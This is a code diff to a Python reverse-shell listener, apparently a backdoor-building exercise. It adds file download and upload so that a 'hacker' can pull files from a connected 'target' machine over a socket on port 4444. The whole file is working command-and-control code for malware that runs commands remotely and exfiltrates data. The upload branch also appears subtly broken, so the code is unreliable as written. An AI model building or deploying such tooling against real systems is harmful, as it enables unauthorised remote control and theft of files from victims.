@@ -1,7 +1,9 @@
 #!/usr/bin/env python
-#cd fun added in serialized file
-#check_output fun not used for cd with path because it is only intended to display result of command not oprn
-import socket,json
+#download functionality added so file of target can be downloaded in hacker running command in hacker
+#file is series of char so to transfer file we should read the file as seq of char,
+# send this seq of char,create new empty file at destination,
+# store the transferred seq of char in new file
+import socket,json,base64
 class Listener:
     def __init__(self,ip,port):
         listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -29,15 +31,27 @@ class Listener:
             self.connection.close()
             exit()
         return self.reliable_receive() 
+    def write_file(self,path,content):
+        with open(path,"wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Successfully downloaded file"    
+    def read_file(self,path):
+        with open(path,"rb") as file:
+            return base64.b64encode(file.read())         
 
     def run(self):
         while True:
             command = input(">>")
             command=command.split(" ")#send command in list besause serialization helps to send in any form
             # print(command)
+            if command[0]=="upload":
+                file_content=self.reliable_receive(command[1])
+                command.append(file_content)
             result=self.execute_remotly(command)
+            if command[0]=="download":
+                result=self.write_file(command[1],result)
             print(result)
 listener_obj=Listener("10.0.2.16",4444)
 listener_obj.run()            
 
- 
+#the downloaded file should be shaved in location with same name rather than printed on screen so
